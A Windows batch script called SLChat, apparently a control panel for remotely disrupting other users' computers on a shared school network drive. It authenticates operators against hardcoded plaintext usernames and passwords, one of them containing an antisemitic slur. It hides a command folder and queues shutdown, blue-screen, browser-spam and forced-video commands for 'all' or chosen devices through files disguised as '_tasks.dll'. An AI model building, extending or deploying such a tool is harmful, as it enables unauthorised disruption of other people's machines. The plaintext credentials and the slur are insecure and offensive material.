::SLChat
:: WRITTEN BY 1K0DE

set "_localMode=true"

set "chcp_on=chcp 65001 > nul"
set "chcp_off=chcp 850 > nul"

@echo off
setlocal DisableDelayedExpansion

::: { Creates variable /AE = Ascii-27 escape code.
::: - %/AE% can be used  with and without DelayedExpansion.
    For /F %%a in ('echo prompt $E ^| cmd')do set "/AE=%%a"
::: }

(Set \n=^^^
%=Newline DNR=%
)
::: / Color Print Macro -
::: Usage: %Print%{RRR;GGG;BBB}text to output
::: \n at the end of the string echo's a new line
::: valid range for RGB values: 0 - 255
  Set Print=For %%n in (1 2)Do If %%n==2 (%\n%
    For /F "Delims=" %%G in ("!Args!")Do (%\n%
      For /F "Tokens=1 Delims={}" %%i in ("%%G")Do Set "Output=%/AE%[0m%/AE%[38;2;%%im!Args:{%%~i}=!"%\n%
      ^< Nul set /P "=!Output:\n=!%/AE%[0m"%\n%
      If "!Output:~-2!"=="\n" (Echo/^&Endlocal)Else (Endlocal)%\n%
    )%\n%
  )Else Setlocal EnableDelayedExpansion ^& Set Args=
::: / Erase Macro -
::: Usage: %Erase%{string of the length to be erased}
  Set Erase=For %%n in (1 2)Do If %%n==2 (%\n%
    For /F "Tokens=1 Delims={}" %%G in ("!Args!")Do (%\n%
      Set "Nul=!Args:{%%G}=%%G!"%\n%
      For /L %%# in (0 1 100) Do (If Not "!Nul:~%%#,1!"=="" ^< Nul set /P "=%/AE%[D%/AE%[K")%\n%
    )%\n%
    Endlocal%\n%
  )Else Setlocal EnableDelayedExpansion ^& Set Args=

setlocal EnableDelayedExpansion

::Escape colors !ESC![<code>;<code>m
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set ESC=%%b
)

:::::::::::::::::::::::::::::::::::::::::::::::: ESC TEXT COLORS
::echo [-] Loading: Text colours...
set "DarkWhite=!ESC![90m"
set "Red=!ESC![91m"
set "Green=!ESC![92m"
set "Yellow=!ESC![93m"
set "Blue=!ESC![94m"
set "Purple=!ESC![95m"
set "Cyan=!ESC![96m"
set "White=!ESC![97m"
::echo [-] Loading: Background colours...
set "b_black=!ESC![100m"
set "b_red=!ESC![101m"
set "b_green=!ESC![102m"
set "b_yellow=!ESC![103;30m"
set "b_blue=!ESC![104m"
set "b_purple=!ESC![105m"
set "b_cyan=!ESC![106m"
set "b_white=!ESC![107m"
::echo [-] Loading: Colour combinations...
set "dark_red=!ESC![31m"
set "white_black=!ESC![7m"
set "red_black=!ESC![7;31m"
set "green_black=!ESC![7;92m"
set "blue_black=!ESC![7;94m"
::echo [-] Loading: Text styles...
set "reset=!ESC![0m"
set "bold=!ESC![1m"
set "underline=!ESC![4m"
:::::::::::::::::::::::::::::::::::::::::::::::: END OF SECTION

set "_dataPATH="
set "_fileName=__SLChat_COMMS"

if "!_localMode!" == "true" (
    set "_dataPATH=!cd!\All Students"
) else (
    set "_dataPATH=P:\Composite\All Students\"
)

title SLChat
cls
echo.
echo Downloading Plugins...
echo.
if exist "Plugins" (
    rmdir /s /q "Plugins"
)
mkdir "Plugins"

cURL -L --output "Plugins/TypeWriter.exe" --url "https://github.com/Batch-Man/TypeIt/blob/main/Src/Files/typewriter.exe?raw=true"
echo.
cURL -L --output "Plugins/StrSplit.exe" --url "https://github.com/Batch-Man/StrSplit/raw/refs/heads/main/bin/StrSplit.exe"
ping localhost -n 3 > nul
cd "Plugins"
cls

%chcp_on%
cls
echo.
%PRINT%{255;255;255}      ▄████████  ▄█        ▄████████    ▄█    █▄       ▄████████     ███                             .--.          \n
%PRINT%{255;255;255}     ███    ███ ███       ███    ███   ███    ███     ███    ███ ▀█████████▄                ,-.------+-.^|  ,-.     \n
%PRINT%{255;255;255}     ███    █▀  ███       ███    █▀    ███    ███     ███    ███    ▀███▀▀██       ,--=======* 
%PRINT%{237;21;50}^)"^(""^)===^)===
%PRINT%{255;255;255}* ^)    \n
%PRINT%{255;255;255}     ███        ███       ███         ▄███▄▄▄▄███▄▄   ███    ███     ███   ▀       �        `-"---==-+-"^|  `-"  \n
%PRINT%{255;255;255}   ▀███████████ ███       ███        ▀▀███▀▀▀▀███▀  ▀███████████     ███           O                 '--'      JW  \n
%PRINT%{255;255;255}            ███ ███       ███    █▄    ███    ███     ███    ███     ███        \n
%PRINT%{255;255;255}      ▄█    ███ ███▌    ▄ ███    ███   ███    ███     ███    ███     ███        \n
%PRINT%{255;255;255}    ▄████████▀  █████▄▄██ ████████▀    ███    █▀      ███    █▀     ▄████▀      \n
%PRINT%{255;255;255}                ▀                                                               \n
%PRINT%{255;255;255}  ════════════════════════════════════════════════════════════════════════════\n\n
%PRINT%{255;255;255}  ^> Written by 1k0de ;)\n
if "!_localMode!" == "true" (
    %PRINT%{255;255;255}  ^>
    %PRINT%{124;38;222} Running in Local Mode ℹ️\n
    goto continue_1
    ::%PRINT%{123;4;214} LOCAL MODE
) else (
    %PRINT%{255;255;255}  ^>
    %PRINT%{71;255;108} Running in Shared Collaboration / Release Mode ℹ️\n
    goto continue_1
)

:continue_1
%PRINT%{255;255;255}  ════════════════════════════════════════════════════════════════════════════\n\n
%PRINT%{255;255;255}  ^>
Call "TypeWriter" " Authentication Required..." 15
echo !bold!
%PRINT%{255;255;255}\n  ^>
Call "TypeWriter" " Current User: %username%" 15
echo.
echo.

ping localhost -n 2 > nul

set "_canPass=false"
set "authInput_1="

if "%username%" == "admin" ( set "_canPass=true" )
if "%username%" == "karim.dalati1" ( set "_canPass=true" )
if "%username%" == "emre.candemir" ( set "_canPass=true" )
if "%username%" == "abdullah.elali" ( set "_canPass=true" )

if "%_canPass%" == "false" (
    echo   !red_black!^| UNWHITELISTED USER : ACCESS DENIED ^|!reset!
    pause > nul
    exit
) else (
    echo   !green_black!^| WHITELISTED USER : ACCESS GRANTED ^|!reset!
)
::echo.
echo.
Call "TypeWriter" "  > Password required for user '%username%'" 15
echo.
%chcp_off%
%PRINT%  ^> 
set "psCommand=powershell -Command "$pword = read-host 'Key' -AsSecureString ; ^
 $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^
          [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)""
for /f "usebackq delims=" %%p in (`%psCommand%`) do set "authInput_1=%%p"

set "_canPass2=false"

if "%username%" == "karim.dalati1" (
    if "%authInput_1%" == "ven" (
        set "_canPass2=true"
    )
    goto continue_2
) else if "%username%" == "admin" (
    if "%authInput_1%" == "testpass" (
        set "_canPass2=true"
    )
    goto continue_2
) else if "%username%" == "emre.candemir" (
    if "%authInput_1%" == "supermanisajew789" (
        set "_canPass2=true"
    )
    goto continue_2
) else if "%username%" == "abdullah.elali" (
    if "%authInput_1%" == "saratayri" (
        set "_canPass2=true"
    )
    goto continue_2
) else ( goto continue_2 )

:continue_2
echo.
ping localhost -n 2 > nul
if "%_canPass2%" == "true" (
    echo   !green_black!^| CORRECT PASSWORD ^|!reset!
    %PRINT%^ ^ 
    echo [ PRESS ANY KEY ]
    pause > nul
    goto searchComms
) else (
    echo   !red_black!^| INVALID PASSWORD - EXITING ^|!reset!
    timeout /t 3 > nul
    exit
)
cls
echo.
echo __SLChat Crashed...
pause > nul
exit

:searchComms
MODE con:cols=79 lines=40
cls
echo.
if "!_localMode!" == "true" (
    Call TypeWriter " > Searching for LOCAL data path..." 15
) else (
    Call TypeWriter " > Searching for SHARED data path..." 15
)
echo.
ping localhost -n 2 > nul
if not exist "!_dataPATH!" (
    echo.
    echo  !red_black!^| LOCAL DATA PATH DOESN'T EXIST - !_dataPATH! - EXITING ^|!reset!
    timeout /t 5 > nul
    exit
)
::echo.
Call TypeWriter " > Searching for COMMS file..." 15
echo.
ping localhost -n 2 > nul
if not exist "!_dataPATH!\!_fileName!" (
    Call TypeWriter " > COMMS file doesn't exist.. Creating it..." 15
    mkdir "!_dataPATH!\!_fileName!"
)
:: Check if COMMS file is hidden, if not then it hides it
for /f "tokens=1" %%A in ('attrib "!_dataPATH!\!_fileName!"') do (
    if not "%%A"=="H" (
        attrib +h "!_dataPATH!\!_fileName!"
    )
)
goto mainMenu
Call TypeWriter " > Searching for connected devices..." 15
ping localhost -n 2 > nul
pause > nul

:mainMenu
%chcp_on%
:: Combine the variables into the full path
set "fullPath=!_dataPATH!\!_fileName!"
set "_mainMenuInput="

:: Set maximum number of spaces (adjust as needed)
set "maxSpaces=56"

:: Create a temporary VBScript to calculate file name length
echo Set objArgs = WScript.Arguments > temp.vbs
echo fileName = objArgs(0) >> temp.vbs
echo WScript.Echo Len(fileName) >> temp.vbs


:: Step 2: Display the menu header
cls
echo  ╔═══════════════════════════════════════════════════════════════════════════╗
echo  ║ !red_black!                          ★  SLChat: DEVICES  ★                          !reset! ║
:: Step 3: Loop through files and display them with padding
echo  ║                                                                           ║
echo  ║ ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ ║
echo  ║  ╭─────────────────────────────────────────────────────────────────────╮  ║
:: Process each file in the directory
for /f "delims=" %%F in ('dir /b "!fullPath!\*"') do (
    set "fileName=%%F"

    :: Call the temporary VBScript to get the length of the file name
    for /f %%L in ('cscript //nologo temp.vbs "!fileName!"') do set "fileLength=%%L"

    :: Calculate the spaces required
    set /a "spacesRequired=!maxSpaces!-!fileLength!"

    :: Generate the spaces
    set "spaces="
    for /l %%S in (1,1,!spacesRequired!) do set "spaces=!spaces! "

    :: Output the file name with the calculated spaces
    echo  ║  ^| !bold!DeviceName:!reset! !fileName!!spaces!^|  ║
)
echo  ║  ╰─────────────────────────────────────────────────────────────────────╯  ║
echo  ║ ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ ║
echo  ╠═══════════════════════════════════════════════════════════════════════════╣
echo  ║ !blue_black!                            COMMAND OPTIONS                              !reset! ║
echo  ║                                                                           ║
echo  ║ ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ ║
echo  ║ $shutdown id/all --Shutsdown the specific device                          ║
echo  ║ $bsod id/all --Triggers blue screen of death on the specific device       ║
echo  ║ $gspam id/all --Spam opens google on the specific device                  ║
echo  ║ $tts id/all TEXT --Text to speech on the specified device                 ║
echo  ║ $karbala id/all --Launches special karbala video on the specified device  ║
echo  ║ $checkactive id/all --Checks if the specific device is active             ║
echo  ║ $FIX_COMMS --FIX/RESET ALL COMMS FILES INCASE OF ERROR                    ║
echo  ║ $clear --Clears cmd window                                                ║
echo  ║ exit --Exits SLChat                                                       ║
echo  ║ ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ ║
echo  ╚═══════════════════════════════════════════════════════════════════════════╝
:: Clean up
del temp.vbs
goto :process_command_MM

:Shutdown_Device
setlocal

::Parameters
set "device_id=%~1"
set "_delay=%~2"

if "!device_id!" == "" (
    echo.
    %PRINT%{255;255;255}  :Shutdown_Device function error: device_id parameter not specified.\n
    goto process_command_MM
)

if "!device_id!" == "all" (
    if "!_delay!" == "" (
        for /f "delims=" %%F in ('dir /b "!fullPath!\*"') do (
            set "fileName=%%F"
            ::echo "!fullPath!\!fileName!" --for debugging
            echo sd_nodelay>>"!fullPath!\!fileName!\_tasks.dll"
        )

        ping localhost -n 2 > nul
        goto process_command_MM
    )

    for /f "delims=" %%F in ('dir /b "!fullPath!\*"') do (
        set "fileName=%%F"
        echo sd_!_delay!>>"!fullPath!\!fileName!\_tasks.dll"
    )

    ping localhost -n 2 > nul
    goto process_command_MM
)

if "!_delay!" == "" (
    ::Shutdown individual device
    echo sd_nodelay>>"!fullPath!\!device_id!\_tasks.dll"
) else (
    ::Shutdown individual device with delay
    echo sd_!_delay!>>"!fullPath!\!device_id!\_tasks.dll"
)
goto process_command_MM

endlocal
goto :eof

:EXECUTE_COMMAND
setlocal

::Parameters
set "cmdName=%~1"
set "device_id=%~2"
set "_delay=%~3"

if "!device_id!" == "" (
    echo.
    %PRINT%{255;255;255}  :BSOD_Device function error: device_id parameter not specified.\n
    goto process_command_MM
)

if "!device_id!" == "all" (
    if "!_delay!" == "" (
        for /f "delims=" %%F in ('dir /b "!fullPath!\*"') do (
            set "fileName=%%F"
            ::echo "!fullPath!\!fileName!" --for debugging
            echo !cmdName!_nodelay>>"!fullPath!\!fileName!\_tasks.dll"
        )

        ping localhost -n 2 > nul
        goto process_command_MM
    )

    for /f "delims=" %%F in ('dir /b "!fullPath!\*"') do (
        set "fileName=%%F"
        echo !cmdName!_!_delay!>>"!fullPath!\!fileName!\_tasks.dll"
    )

    ping localhost -n 2 > nul
    goto process_command_MM
)

if "!_delay!" == "" (
    ::Shutdown individual device
    echo !cmdName!_nodelay>>"!fullPath!\!device_id!\_tasks.dll"
) else (
    ::Shutdown individual device with delay
    echo !cmdName!_!_delay!>>"!fullPath!\!device_id!\_tasks.dll"
)
goto process_command_MM

endlocal
goto :eof

:process_command_MM
%chcp_on%
set "_mainMenuInput="
set /a _count=0
set "arg_1="
set "arg_2="
set "arg_3="
echo.
%PRINT%{255;255;255} 
set /p _mainMenuInput="► "
%chcp_off%

for /f "tokens=*" %%A in ('StrSplit " " "!_mainMenuInput!"') do (
    set /a _count+=1
    set "arg_!_count!=%%A"
)

if "!_mainMenuInput!" == "" (
    goto process_command_MM
)

for /f "delims=" %%A in ('powershell -Command "[Console]::WriteLine('!arg_1!'.ToLower())"') do set "arg_1=%%A"

if "!arg_1!" == "" ( goto process_command_MM )

if "!arg_1!" == "exit" ( exit )

if "!arg_1!" == "$clear" ( goto mainMenu )

if "!arg_1!" == "$shutdown" (
    if "!arg_2!" == "" (
        echo.
        %PRINT%{255;255;255}  Invalid command usage, please specify the device id.\n
        %PRINT%{255;255;255}  Usage: $shutdown [DEVICE_ID: string] [DELAY: number]\n
        goto process_command_MM
    )

    for /f "delims=" %%A in ('powershell -Command "[Console]::WriteLine('!arg_2!'.ToLower())"') do set "arg_2=%%A"
    echo.

    if "!arg_2!" == "all" (
        if "!arg_3!" == "" (
            Call TypeWriter "  > Shutting down ALL ACTIVE DEVICES.." 15
            echo.
            
            CALL :Shutdown_Device "all"

            echo.
            goto process_command_MM
        )

        set /a _delay=!arg_3! 2>nul
        if "!_delay!" == "!arg_3!" (
            ::arg3 IS a number
            Call TypeWriter "  > Shutting down ALL ACTIVE DEVICES with a DELAY of !_delay! seconds.." 15
            echo.

            CALL :Shutdown_Device "all" !_delay!

            echo.
            goto process_command_MM
        ) else (
            ::arg3 IS NOT a number
            %PRINT%{255;255;255}  Invalid command usage, DELAY must be a number.\n
            %PRINT%{255;255;255}  Usage: $shutdown [DEVICE_ID: string] [DELAY: number]\n
            goto process_command_MM
        )
        
    )

    ::Ensure device id exists
    if not exist "!fullPath!\!arg_2!" (
        Call TypeWriter "  > Device Id '!arg_2!' not found..." 15
        echo.
        goto process_command_MM
    )


    if "!arg_3!" == "" (
        Call TypeWriter "  > Shutting down device: !arg_2!.." 15
        echo.

        CALL :Shutdown_Device "!arg_2!"

        echo.
        goto process_command_MM
    )
    
    set /a _delay=!arg_3! 2>nul
    if "!_delay!" == "!arg_3!" (
        ::arg3 IS a number
        Call TypeWriter "  > Shutting down device: !arg_2! with a DELAY of !_delay! seconds.." 15
        echo.

        CALL :Shutdown_Device "!arg_2!" !arg_3!

        echo.
        goto process_command_MM
    ) else (
        ::arg3 IS NOT a number
        %PRINT%{255;255;255}  Invalid command usage, DELAY must be a number.\n
        %PRINT%{255;255;255}  Usage: $shutdown [DEVICE_ID: string] [DELAY: number]\n
        goto process_command_MM
    )
)

echo.
%PRINT%{255;255;255}  [Unknown Command]: !arg_1!\n

goto :process_command_MM

pause > nul
exit
